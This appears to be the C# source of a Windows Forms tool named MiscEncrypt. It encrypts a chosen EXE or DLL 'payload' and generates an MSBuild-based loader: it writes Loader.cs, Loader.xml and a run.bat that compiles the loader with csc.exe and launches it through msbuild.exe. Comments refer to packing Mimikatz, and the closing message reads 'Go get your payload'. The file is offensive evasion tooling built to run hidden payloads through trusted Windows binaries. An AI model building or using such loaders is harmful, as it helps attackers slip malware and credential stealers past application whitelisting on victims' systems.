using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

using System.Windows.Forms;

namespace MiscEncrypt
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            InitializeOpenFileDialog();
        }

        private void InitializeOpenFileDialog()
        {
            // Set the file dialog to filter for graphics files.
            this.openFileDialog1.Filter =
              "Images (*.EXE;*.DLL;)|*.EXE;*.DLL;|" +
              "All files (*.*)|*.*";

            this.openFileDialog1.Multiselect = false;
            this.openFileDialog1.Title = "Select Payload";
        }

        private void btnSelectFile_Click(object sender, EventArgs e)
        {
            DialogResult dr = this.openFileDialog1.ShowDialog();
            if (dr == System.Windows.Forms.DialogResult.OK)
            {

                lblFilePath.Text = openFileDialog1.FileName;
                //byte[] latestMimikatz = Misc.Decrypt(Convert.FromBase64String(this.MyProperty), "password"); //Yes, this is a bad idea.
                //byte[] latestMimikatz = Misc.Encrypt(Convert.FromBase64String(this.MyProperty), "password"); //Yes, this is a bad idea.





                // Read the files
                //foreach (String file in openFileDialog1.FileNames)
                //{
                //    // Create a PictureBox.
                //    try
                //    {
                //        PictureBox pb = new PictureBox();
                //        Image loadedImage = Image.FromFile(file);
                //        pb.Height = loadedImage.Height;
                //        pb.Width = loadedImage.Width;
                //        pb.Image = loadedImage;
                //        flowLayoutPanel1.Controls.Add(pb);
                //    }
                //    catch (SecurityException ex)
                //    {
                //        // The user lacks appropriate permissions to read files, discover paths, etc.
                //        MessageBox.Show("Security error. Please contact your administrator for details.\n\n" +
                //            "Error message: " + ex.Message + "\n\n" +
                //            "Details (send to Support):\n\n" + ex.StackTrace
                //        );
                //    }
                //    catch (Exception ex)
                //    {
                //        // Could not load the image - probably related to Windows file system permissions.
                //        MessageBox.Show("Cannot display the image: " + file.Substring(file.LastIndexOf('\\'))
                //            + ". You may not have permission to read the file, or " +
                //            "it may be corrupt.\n\nReported error: " + ex.Message);
                //    }
                //}
            }
        }

        private void btnSelectOutput_Click(object sender, EventArgs e)
        {
            string dummyFileName = "EncryptedFile.Out";
            FolderBrowserDialog fbd = new FolderBrowserDialog();

            if (fbd.ShowDialog() == DialogResult.OK)
            {
                lblOutputFile.Text = fbd.SelectedPath;
            }

            //SaveFileDialog sf = new SaveFileDialog();
            //// Feed the dummy name to the save dialog
            //sf.FileName = dummyFileName;

            //if (sf.ShowDialog() == DialogResult.OK)
            //{
            //    // Now here's our save folder
            //   // string savePath = Path.GetDirectoryName(sf.FileName);
            //    lblOutputFile.Text = sf.FileName;
            //    // Do whatever
            //}
        }

        private void btnCreatePayload_Click(object sender, EventArgs e)
        {


            var base64EncodedFromEncryptedFile = Misc.Stage(lblFilePath.Text, txtPassword.Text);
            CreateLoaderFiles(base64EncodedFromEncryptedFile);
            MessageBox.Show("complete! Go get your payload");
        }

        private void CreateLoaderFiles(string encryptedString)
        {

            string csText = File.ReadAllText("LoaderCS.txt");
            csText = csText.Replace("ReplacePassword", txtPassword.Text);
            string csPath = Path.Combine(lblOutputFile.Text, "Loader.cs");
            File.WriteAllText(csPath, csText);

            string xmlText = File.ReadAllText("LoaderXML.txt");
            xmlText = xmlText.Replace("ReplaceMe", encryptedString);
            string xmlPath = Path.Combine(lblOutputFile.Text, "Loader.xml");
            File.WriteAllText(xmlPath, xmlText);



            string batPath = Path.Combine(lblOutputFile.Text, "run.bat");
            File.WriteAllText(batPath, @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:Microsoft.Build.Framework.dll,Microsoft.Build.Tasks.v4.0.dll,Microsoft.Build.Utilities.v4.0.dll,System.IO.Compression.dll /unsafe /target:library Loader.cs");
            File.AppendAllText(batPath, Environment.NewLine);
            File.AppendAllText(batPath, @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe Loader.xml");


        }
    }
}
